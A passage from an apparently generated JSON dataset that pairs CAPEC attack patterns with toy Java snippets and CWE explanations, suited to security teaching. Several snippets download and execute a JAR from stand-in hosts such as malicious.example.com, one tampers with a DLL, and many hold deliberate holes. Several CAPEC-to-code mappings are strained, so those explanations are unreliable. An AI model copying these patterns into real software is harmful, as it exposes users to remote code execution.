        "description": "This Java code snippet represents a simple login system that is vulnerable to several security weaknesses. The main idea of the CAPEC 'Influence via Psychological Principles' is embodied by the simplicity and predictability of the authentication mechanism, which can be easily exploited by an adversary who understands human behavior and common password choices.\n\n1. CWE-654: The authentication mechanism relies solely on the password for granting access, making it vulnerable to attacks if the password is guessed or compromised.\n2. CWE-205: The system's behavior (printing 'Login successful!' or 'Login failed.') reveals whether the password is correct, which can be observed by unauthorized actors.\n3. CWE-673: The code does not prevent external influence on the control sphere, as it allows any input to be processed without additional validation.\n4. CWE-301: Although not directly shown, the simplicity of the authentication protocol could be susceptible to reflection attacks if extended.\n5. CWE-222: The code does not truncate security-relevant information, but it could be extended to do so, obscuring the nature of an attack.\n\nOverall, the code demonstrates how an adversary can leverage psychological principles and common security weaknesses to influence the target's actions or behavior."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ClientHandler(socket).start();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try (InputStream input = socket.getInputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n             OutputStream output = socket.getOutputStream();\n             PrintWriter writer = new PrintWriter(output, true)) {\n\n            String clientMessage;\n            while ((clientMessage = reader.readLine()) != null) {\n                // Echo the message back to the client\n                writer.println(clientMessage);\n\n                // Log the message (potential truncation of security-relevant information)\n                System.out.println(\"Received: \" + clientMessage.substring(0, Math.min(clientMessage.length(), 10)));\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. When a client connects, it starts a new thread to handle the communication. The server echoes back any message received from the client and logs the first 10 characters of the message. This code embodies the main idea of CAPEC-Influence via Modes of Thinking by establishing a communication channel without proper verification of the source (CWE-940) and potentially truncating security-relevant information (CWE-222). The server's behavior can be exploited by an attacker to manipulate the communication and extract information from the target."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import java.util.Scanner;\n\npublic class EyeCueVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate eye movement tracking (vulnerable part)\n        boolean eyeMovementDetected = detectEyeMovement();\n        if (eyeMovementDetected) {\n            System.out.println(\"Eye movement detected. Please try again.\");\n        } else {\n            System.out.println(\"Password accepted.\");\n        }\n    }\n\n    private static boolean detectEyeMovement() {\n        // Simulated eye movement detection logic\n        // In a real scenario, this would involve complex eye-tracking algorithms\n        // Here, we simulate a discrepancy based on a random condition\n        return Math.random() > 0.5;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where an adversary could gain information via non-verbal means, specifically through eye movements, as described in the CAPEC. The code prompts the user to enter a password and then simulates eye movement detection. If eye movement is detected, the user is asked to try again, otherwise, the password is accepted. This represents CWE-205 (Observable Behavioral Discrepancy) and CWE-203 (Observable Discrepancy) as the system's behavior changes based on eye movement detection, which could be observed by an unauthorized actor. The code also indirectly touches on CWE-451 (UI Misrepresentation of Critical Information) by potentially misleading the user about the reason for the retry prompt."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n\n            // Simulate sensitive information exposure\n            String sensitiveData = \"User password: 12345\";\n            logger.info(\"Sensitive data: \" + sensitiveData);\n\n            // Simulate speculative execution vulnerability\n            speculativeExecutionAttack();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void speculativeExecutionAttack() {\n        // Simulate a speculative execution attack\n        int[] array = new int[10];\n        int index = 20; // Out of bounds index\n        try {\n            int value = array[index]; // This will cause an exception\n        } catch (ArrayIndexOutOfBoundsException e) {\n            // Handle exception\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism and a speculative execution attack. The logger writes sensitive information (a user's password) to a server log file, which is an example of CWE-532 (Information Exposure Through Log Files). Additionally, the speculativeExecutionAttack method simulates a speculative execution attack by attempting to access an out-of-bounds array index, which can lead to transient execution vulnerabilities (CWE-1420). The code embodies the deprecated CAPEC pattern of 'Target Influence via Micro-Expressions' by showing how microarchitectural state and speculative execution can expose sensitive information."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (userInput == null || userInput.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n        try {\n            // Simulate processing that could fail\n            if (userInput.contains(\"<script>\")) {\n                throw new Exception(\"Script detected\");\n            }\n        } catch (Exception e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error: \" + e.getMessage());\n            return;\n        }\n        \n        // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n        String template = \"<html><body>Welcome, ${userInput}</body></html>\";\n        String output = template.replace(\"${userInput}\", userInput);\n        response.getWriter().write(output);\n    }\n}\n",
        "description": "This Java servlet code demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Target Influence via Neuro-Linguistic Programming (NLP)' and associated CWEs. The servlet processes user input without proper validation and neutralization, leading to multiple security issues:\n\n1. **CWE-1286: Improper Validation of Syntactic Correctness of Input** - The code checks if the input is null or empty but does not validate its syntactic correctness.\n2. **CWE-81: Improper Neutralization of Script in an Error Message Web Page** - If an exception occurs, the error message includes the user input directly, which could contain scripts.\n3. **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine** - The user input is directly inserted into an HTML template without proper neutralization, making it vulnerable to template injection attacks.\n\nThe code snippet highlights the importance of proper input validation and neutralization to prevent security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableNLP {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a command:\");\n        String userInput = scanner.nextLine();\n\n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (userInput.matches(\"[a-zA-Z0-9 ]*\")) {\n            // CWE-149: Improper Neutralization of Quoting Syntax\n            String command = \"echo '\" + userInput + \"'\";\n            try {\n                Process process = Runtime.getRuntime().exec(command);\n                process.waitFor();\n                System.out.println(\"Command executed: \" + command);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Invalid input.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a command execution system influenced by user input, which aligns with the deprecated CAPEC 'Target Influence via Voice in NLP'. The code reads a command from the user and executes it without proper validation or neutralization of special characters, leading to potential security risks. Specifically, it showcases CWE-1286 (Improper Validation of Syntactic Correctness of Input) by only allowing alphanumeric characters and spaces, but failing to handle other potentially dangerous inputs. It also demonstrates CWE-149 (Improper Neutralization of Quoting Syntax) by directly injecting user input into a shell command, which could be exploited for command injection attacks."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class HumanBufferOverflowExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            StringBuilder message = new StringBuilder();\n            String line;\n            while ((line = in.readLine()) != null) {\n                message.append(line);\n            }\n            socket.close();\n            processMessage(message.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processMessage(String message) {\n        // Simulate subconscious message processing\n        if (message.contains(\"secret\")) {\n            System.out.println(\"Sensitive information detected: \" + message);\n        } else {\n            System.out.println(\"Message received: \" + message);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Target Influence via The Human Buffer Overflow' concept. The code establishes a socket connection to a server and reads messages from it. The messages are appended to a StringBuilder without any integrity checks, which can be seen as a metaphor for how an attacker might embed subconscious commands within a communication channel. The 'processMessage' method simulates the subconscious processing of these messages, where certain keywords trigger specific actions. This example also touches on related CWEs, such as CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-120 (Buffer Copy without Checking Size of Input), by showing how messages are read and processed without proper validation or encryption."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import java.util.Scanner;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a data query that exposes sensitive information\n        if (username.equals(\"admin\")) {\n            System.out.println(\"Welcome admin! Here is the sensitive data: [Sensitive Data]\");\n        } else {\n            System.out.println(\"Welcome \" + username + \"!\");\n        }\n\n        // Simulate a CAPTCHA that is easily guessable\n        System.out.println(\"Please solve the CAPTCHA: What is 2 + 2?\");\n        int captcha = scanner.nextInt();\n        if (captcha == 4) {\n            System.out.println(\"CAPTCHA passed.\");\n        } else {\n            System.out.println(\"CAPTCHA failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information can be exposed through data queries and a guessable CAPTCHA. The code asks for a username and password, and if the username is 'admin', it exposes sensitive data. This represents CWE-202 (Exposure of Sensitive Information Through Data Queries). Additionally, the code includes a simple CAPTCHA challenge ('What is 2 + 2?'), which is easily guessable, representing CWE-804 (Guessable CAPTCHA). The main idea of the CAPEC is to show how an attacker can influence the target to reveal sensitive information through seemingly innocuous interactions, such as interviews or interrogations."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establishing a communication channel without verifying the endpoint\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Sending data without verifying the destination\n            out.println(\"Sensitive Data\");\n\n            // Receiving data without verifying the source\n            String response = in.readLine();\n            System.out.println(\"Received: \" + response);\n\n            // Observable behavioral discrepancy\n            if (response.equals(\"Expected Response\")) {\n                System.out.println(\"Operation successful\");\n            } else {\n                System.out.println(\"Operation failed\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC 'Target Influence via Instant Rapport' and related CWEs. The code establishes a socket connection to 'example.com' on port 8080 without verifying the identity of the endpoint (CWE-300). It sends sensitive data without ensuring the destination is correct (CWE-941) and receives data without verifying the source (CWE-940). Additionally, the code exhibits observable behavioral discrepancies (CWE-205) by printing different messages based on the response, which could reveal internal state information to an unauthorized actor. This snippet highlights the risks of inadequate verification and the potential for external influence on communication channels."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class VulnerableDevice {\n    private static final String CONFIG_FILE = \"/path/to/config\";\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n\n    public static void main(String[] args) {\n        // Simulate loading a component that is not sufficiently trustworthy\n        Component untrustedComponent = new Component(\"untrusted_component\");\n        if (!untrustedComponent.isTrusted()) {\n            System.out.println(\"Warning: Using an untrusted component!\");\n        }\n\n        // Simulate accessing confidential information\n        String confidentialData = loadConfidentialData();\n        System.out.println(\"Confidential Data: \" + confidentialData);\n\n        // Simulate releasing the product in a non-release configuration\n        if (isPreProductionConfig()) {\n            System.out.println(\"Warning: Product is in pre-production configuration!\");\n        }\n\n        // Simulate insufficient technical documentation\n        if (!hasSufficientDocumentation()) {\n            System.out.println(\"Warning: Insufficient technical documentation!\");\n        }\n\n        // Simulate reliance on a non-updateable component\n        if (!untrustedComponent.isUpdateable()) {\n            System.out.println(\"Warning: Component is not updateable!\");\n        }\n    }\n\n    private static String loadConfidentialData() {\n        // Simulate loading confidential data\n        return \"confidential_information\";\n    }\n\n    private static boolean isPreProductionConfig() {\n        // Simulate checking for pre-production configuration\n        return true;\n    }\n\n    private static boolean hasSufficientDocumentation() {\n        // Simulate checking for sufficient documentation\n        return false;\n    }\n}\n\nclass Component {\n    private String name;\n\n    public Component(String name) {\n        this.name = name;\n    }\n\n    public boolean isTrusted() {\n        // Simulate trust check\n        return false;\n    }\n\n    public boolean isUpdateable() {\n        // Simulate updateability check\n        return false;\n    }\n}",
        "description": "This Java code snippet represents a vulnerable device that embodies the main idea of the CAPEC 'Modification During Manufacture'. The code simulates the use of an untrusted component, accessing confidential information, releasing the product in a non-release configuration, insufficient technical documentation, and reliance on a non-updateable component. These elements are derived from the related CWEs, highlighting the risks associated with using untrusted components, exposing confidential data, improper release configurations, lack of documentation, and non-updateable components. The code demonstrates how these vulnerabilities can be present in a product, making it susceptible to attacks during the manufacturing process."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableDistribution {\n    public static void main(String[] args) {\n        // CWE-1269: Product Released in Non-Release Configuration\n        Properties config = new Properties();\n        try (InputStream input = new FileInputStream(\"config.properties\")) {\n            config.load(input);\n            String mode = config.getProperty(\"mode\");\n            if (\"development\".equals(mode)) {\n                System.out.println(\"Warning: Running in development mode!\");\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        try (BufferedReader br = new BufferedReader(new FileReader(\"sensitive_data.txt\"))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line); // Potentially exposing sensitive information\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        try {\n            Class.forName(\"com.vulnerable.thirdparty.Component\");\n            System.out.println(\"Using vulnerable third-party component\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. The code includes: \n1. **CWE-1269**: The application reads a configuration file and warns if it is running in 'development' mode, indicating a non-release configuration.\n2. **CWE-200**: The application reads and prints sensitive information from a file, potentially exposing it to unauthorized actors.\n3. **CWE-1395 and CWE-1357**: The application attempts to load a third-party component that may be vulnerable or insufficiently trustworthy. \nThese vulnerabilities highlight the risks of tampering and manipulation during the distribution process, where products may be compromised at various stages before reaching the end user."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "public class HardwareIntegrityAttack {\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 0;\n    private static final int MAX_CLOCK_SPEED = 3000; // in MHz\n    private static final int MIN_CLOCK_SPEED = 1000; // in MHz\n\n    public static void main(String[] args) {\n        // Simulate voltage glitch attack\n        int voltage = 6; // Voltage glitch beyond max limit\n        if (voltage > MAX_VOLTAGE || voltage < MIN_VOLTAGE) {\n            System.out.println(\"Voltage glitch detected! System may be compromised.\");\n        }\n\n        // Simulate clock glitch attack\n        int clockSpeed = 3500; // Clock glitch beyond max limit\n        if (clockSpeed > MAX_CLOCK_SPEED || clockSpeed < MIN_CLOCK_SPEED) {\n            System.out.println(\"Clock glitch detected! System may be compromised.\");\n        }\n\n        // Simulate unauthorized error injection\n        boolean isAuthorized = false;\n        if (!isAuthorized) {\n            injectError();\n        }\n\n        // Simulate reliance on non-updateable component\n        boolean isComponentUpdateable = false;\n        if (!isComponentUpdateable) {\n            System.out.println(\"Warning: Non-updateable component detected. Vulnerabilities cannot be patched.\");\n        }\n\n        // Simulate security version rollback\n        int currentVersion = 2;\n        int rollbackVersion = 1;\n        if (rollbackVersion < currentVersion) {\n            System.out.println(\"Security version rollback detected! System may be vulnerable.\");\n        }\n    }\n\n    private static void injectError() {\n        System.out.println(\"Error injected into the system. Redundancy may be compromised.\");\n    }\n}",
        "description": "This Java code snippet simulates various hardware integrity attacks as described in the CAPEC and related CWEs. It includes scenarios for voltage and clock glitch attacks, unauthorized error injection, reliance on non-updateable components, and security version rollback. The code checks for conditions that represent these vulnerabilities and prints warnings when such conditions are detected. This demonstrates how an adversary might exploit weaknesses in the system maintenance process to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "public class MaliciousLogic {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (isInfected()) {\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMalware();\n        }\n    }\n\n    private static boolean isInfected() {\n        // CWE-284: Improper Access Control\n        // Simulate improper access control check\n        return true; // Always returns true, indicating the system is infected\n    }\n\n    private static void replicateMalware() {\n        // Malicious logic to replicate malware\n        System.out.println(\"Replicating malware...\");\n        // CWE-1229: Creation of Emergent Resource\n        createBackdoor();\n    }\n\n    private static void createBackdoor() {\n        // Simulate creation of a backdoor\n        System.out.println(\"Backdoor created.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious code within a seemingly benign application. The `isInfected` method simulates an improper access control check (CWE-284), always returning true to indicate the system is infected. If the system is infected, the `replicateMalware` method is called, which simulates the replication of malware (CWE-509). Additionally, the `createBackdoor` method is called to simulate the creation of a backdoor (CWE-1229), representing the creation of an emergent resource that can be exploited by attackers. This code embodies the main idea of CAPEC-180 by demonstrating how malicious logic can be inserted into a system to achieve negative impacts."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class InfectedSoftware {\n    public static void main(String[] args) {\n        System.out.println(\"This is a benign message.\");\n        // Malicious code hidden in plain sight\n        if (args.length > 0 && args[0].equals(\"trigger\")) {\n            executeMaliciousLogic();\n        }\n    }\n\n    private static void executeMaliciousLogic() {\n        // Simulate malicious behavior\n        System.out.println(\"Malicious logic executed!\");\n        // Example: Download and execute code without integrity check\n        try {\n            URL url = new URL(\"http://malicious.example.com/malware.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malware.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            Runtime.getRuntime().exec(\"java -jar malware.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The main method prints a benign message, but contains hidden malicious logic that is triggered by a specific command-line argument ('trigger'). When triggered, the malicious logic downloads and executes a JAR file from a remote location without performing any integrity checks, embodying CWE-494 (Download of Code Without Integrity Check). This represents the idea of embedding malicious code (CWE-506) and potentially replicating malicious code (CWE-509) if the downloaded code attempts to spread further. The code also illustrates the concept of a Trojan Horse (CWE-507), where the software appears benign but contains hidden malicious functionality."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Load and execute the downloaded code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an authorized developer injects malicious logic into a product. The code downloads an update from a remote location without performing any integrity checks (CWE-494). This downloaded code could contain embedded malicious code (CWE-506) that gets executed, potentially creating new resources or permissions that can be exploited (CWE-1229, CWE-277). The lack of integrity checks and administrator control over security settings (CWE-671) makes the system vulnerable to attacks. This snippet embodies the main idea of CAPEC-184: 'Malicious Logic Inserted Into Product by Authorized Developer'."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class SecureApp {\n    private static boolean securityCheck = false;\n\n    public static void main(String[] args) {\n        // Security-critical code that should not be optimized away\n        if (securityCheck) {\n            System.out.println(\"Security check passed.\");\n        } else {\n            System.out.println(\"Security check failed.\");\n        }\n\n        // Malicious code inserted during development\n        if (true) { // This condition is always true, representing a backdoor\n            System.out.println(\"Malicious code executed.\");\n            // Exposing sensitive system information\n            System.out.println(\"System info: \" + System.getProperty(\"os.name\") + \", \" + System.getProperty(\"user.name\"));\n        }\n    }\n}",
        "description": "This Java code snippet represents a scenario where an adversary has altered the development of a software application to include malicious logic. The code includes a security check that is vulnerable to compiler or processor optimization removal (CWE-733, CWE-1037), as the 'securityCheck' variable is always false and the check might be optimized away. Additionally, the code contains embedded malicious code (CWE-506) that always executes due to a hardcoded true condition, representing a backdoor. This malicious code also exposes sensitive system information (CWE-497) by printing the operating system name and user name. The snippet demonstrates how an adversary can insert harmful logic during development to achieve a negative impact when the system is deployed, aligning with the CAPEC description of Development Alteration."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads an update from a remote server without performing any integrity checks (CWE-494). After downloading, it executes the downloaded JAR file, which could contain malicious code (CWE-829). This represents the main idea of the CAPEC, where an adversary manipulates the configuration management to introduce malicious logic into the software."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import java.util.*;\nimport com.untrusted.library.UntrustedComponent;\n\npublic class VulnerableApplication {\n    public static void main(String[] args) {\n        // Using a third-party component from an untrusted source\n        UntrustedComponent component = new UntrustedComponent();\n        component.execute();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable application that imports and uses a third-party component from an untrusted source. The 'UntrustedComponent' class is part of a library that is not within the intended control sphere, representing CWE-829. The use of this component could introduce known vulnerabilities (CWE-1395) or even embedded malicious code (CWE-506) into the application. Additionally, the reliance on this insufficiently trustworthy component (CWE-1357) could compromise the security, reliability, and maintainability of the product. This snippet embodies the main idea of CAPEC-442, where an adversary could exploit the inclusion of insecure third-party components to conduct supply chain attacks."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecureSystem {\n    private boolean isAuthenticated = false;\n    private String sensitiveData = \"Sensitive Information\";\n\n    // Design alteration: intentionally flawed authentication mechanism\n    public void authenticate(String password) {\n        // CWE-657: Violation of Secure Design Principles\n        if (password.equals(\"password123\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    public String getSensitiveData() {\n        if (isAuthenticated) {\n            return sensitiveData;\n        } else {\n            return \"Access Denied\";\n        }\n    }\n\n    public static void main(String[] args) {\n        SecureSystem system = new SecureSystem();\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(\"Sensitive Data: \" + system.getSensitiveData());\n    }\n}",
        "description": "This Java code snippet represents a system where the design has been intentionally altered to introduce vulnerabilities. The `authenticate` method uses a weak password check (CWE-657), violating secure design principles. The `getSensitiveData` method relies on client-side enforcement of security (CWE-602), which is inherently insecure. Additionally, the `main` method exposes sensitive information without proper authentication (CWE-497). This code embodies the concept of a design alteration attack, where the system's design is modified to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // Untrusted search path vulnerability (CWE-426)\n            String dllPath = args[0];\n            Path path = Paths.get(dllPath);\n            byte[] dllBytes = Files.readAllBytes(path);\n\n            // Embed malicious code (CWE-506)\n            byte[] maliciousCode = new byte[]{(byte)0x90, (byte)0x90, (byte)0x90}; // NOP sled as a placeholder\n            int insertPosition = findInsertPosition(dllBytes);\n            System.arraycopy(maliciousCode, 0, dllBytes, insertPosition, maliciousCode.length);\n\n            // Write the tampered DLL back to disk\n            Files.write(path, dllBytes);\n\n            // Replicating malicious code (CWE-509)\n            replicateMaliciousCode(dllPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static int findInsertPosition(byte[] dllBytes) {\n        // Simplified logic to find a gap in the DLL\n        for (int i = 0; i < dllBytes.length - 3; i++) {\n            if (dllBytes[i] == 0x00 && dllBytes[i+1] == 0x00 && dllBytes[i+2] == 0x00) {\n                return i;\n            }\n        }\n        return dllBytes.length - 3; // Fallback to end of file\n    }\n\n    private static void replicateMaliciousCode(String dllPath) {\n        // Simplified replication logic\n        try {\n            Path targetPath = Paths.get(dllPath + \".infected\");\n            Files.copy(Paths.get(dllPath), targetPath, StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code reads a DLL file from an untrusted search path (CWE-426), finds a gap in the DLL's byte array, and inserts a simple NOP sled as a placeholder for malicious code (CWE-506). It then writes the tampered DLL back to disk and attempts to replicate the malicious code by copying the infected DLL to a new file (CWE-509). This example highlights the vulnerabilities and potential exploits associated with embedding malicious code into DLLs."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        String userInputPath = \"C:\\\\Users\\\\Public\\\\Documents\\\\malicious.txt\";\n        if (isValidPath(userInputPath)) {\n            try {\n                File file = new File(userInputPath);\n                if (file.createNewFile()) {\n                    FileWriter writer = new FileWriter(file);\n                    writer.write(\"This is a benign file.\");\n                    writer.close();\n                    // Hidden malicious code\n                    Runtime.getRuntime().exec(\"cmd.exe /c start C:\\\\Windows\\\\System32\\\\calc.exe\");\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static boolean isValidPath(String path) {\n        // Improper handling of Windows device names\n        String[] invalidNames = {\"AUX\", \"CON\", \"NUL\", \"PRN\"};\n        for (String name : invalidNames) {\n            if (path.toUpperCase().contains(name)) {\n                return false;\n            }\n        }\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a seemingly benign file is created on a USB stick, but it also contains hidden malicious code. The main function creates a file at a user-specified path and writes some benign content to it. However, it also executes a hidden command to launch the calculator application, representing a Trojan Horse (CWE-507) and Embedded Malicious Code (CWE-506). The isValidPath function checks for improper handling of Windows device names (CWE-67) to avoid denial of service or information exposure. This snippet embodies the main idea of CAPEC-448, showing how malware can propagate via a USB stick by embedding malicious code in seemingly harmless files."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
